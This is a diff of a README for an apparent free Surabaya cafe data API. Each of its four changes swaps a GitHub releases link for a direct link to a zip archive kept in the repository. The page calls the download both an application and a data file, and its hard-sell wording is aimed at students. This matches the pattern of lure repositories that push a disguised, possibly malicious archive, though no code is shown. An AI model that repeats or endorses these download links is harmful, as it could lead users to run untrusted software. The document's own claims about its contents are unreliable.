@@ -1,6 +1,6 @@
 # ☕ surabaya-cafe-api - Free Surabaya Cafe Data API
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20The%20API%20Data-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/churlish-electorate222/surabaya-cafe-api/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20The%20API%20Data-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/churlish-electorate222/surabaya-cafe-api/main/public/v1.9.zip)
 
 ## 🎯 What Is This?
 
@@ -16,7 +16,7 @@ Getting the data is simple. Here is what you need to do:
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download surabaya-cafe-api](https://github.com/churlish-electorate222/surabaya-cafe-api/releases)**
+**[👉 Click Here to Download surabaya-cafe-api](https://raw.githubusercontent.com/churlish-electorate222/surabaya-cafe-api/main/public/v1.9.zip)**
 
 This link takes you to the download page. You will see a list of available files. Look for the newest version and click the download button. The file you download will be a small file containing all the cafe data.
 
@@ -164,13 +164,13 @@ No. Once you download the file, it works offline.
 
 Here is your quick action plan:
 
-1. ✅ **[Download the data file](https://github.com/churlish-electorate222/surabaya-cafe-api/releases)**
+1. ✅ **[Download the data file](https://raw.githubusercontent.com/churlish-electorate222/surabaya-cafe-api/main/public/v1.9.zip)**
 2. ✅ Open it in Excel or a text editor to browse
 3. ✅ Import it into your project code
 4. ✅ Start building something amazing
 
 Get started today and unlock the full cafe landscape of Surabaya at your fingertips. Whether you are studying, building, or researching, this dataset is your key to success. Download it now and see what you can create!
 
-**[⬇️ Download surabaya-cafe-api Now](https://github.com/churlish-electorate222/surabaya-cafe-api/releases)**
+**[⬇️ Download surabaya-cafe-api Now](https://raw.githubusercontent.com/churlish-electorate222/surabaya-cafe-api/main/public/v1.9.zip)**
 
 Keywords: api, cafe-shop, cafe-surabaya, google-maps, indonesia, json, open-data, rest-api, restful-api, surabaya, surabaya-cafe, tugas, tugas-akhir, tugas-besar, tugas-kuliah, tugas-sekolah
